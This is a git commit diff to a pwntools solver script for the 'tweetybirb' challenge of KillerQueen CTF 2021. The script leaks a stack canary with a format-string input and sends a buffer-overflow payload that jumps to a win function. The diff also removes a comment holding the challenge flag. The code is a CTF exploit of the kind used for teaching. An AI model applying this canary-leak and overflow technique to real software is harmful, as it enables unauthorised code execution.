4b8a29addb1bf817161ba8b9e8cabba928482054
ArjunaAcchaDipa <62648000+ArjunaAcchaDipa@users.noreply.github.com>
2021-12-13 00:38:47 +0700

    Update: tweet_solver.py

--- KillerQueen-2021/tweetybirb/tweet_solver.py
+++ KillerQueen-2021/tweetybirb/tweet_solver.py
@@ -1,30 +1,26 @@
-# kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}
-
 from pwn import *
 
 win = 0x00000000004011db
 ret = 0x0000000000401272
 # canary -> %15$p
 
-rdxOffset = 72
-rbpOffset = 80
+offset = 72
 
 host = "143.198.184.186"
 port = 5002
 
-# s = process("./tweetybirb")
-s = remote(host, port)
+s = process("./tweetybirb")
+# s = remote(host, port)
 
 print(s.recvline().decode())
 
 s.sendline(b"%15$p")
 
 canary = int(s.recvline().decode(), 16)
-print("Canary: {}".format(canary))
+log.info("Canary: {}".format(hex(canary)))
 print(s.recvline().decode())
 
-payload = b""
-payload += b"A"*rdxOffset
+payload = b"A"*offset
 payload += p64(canary)
 payload += p64(ret)
 payload += p64(win)
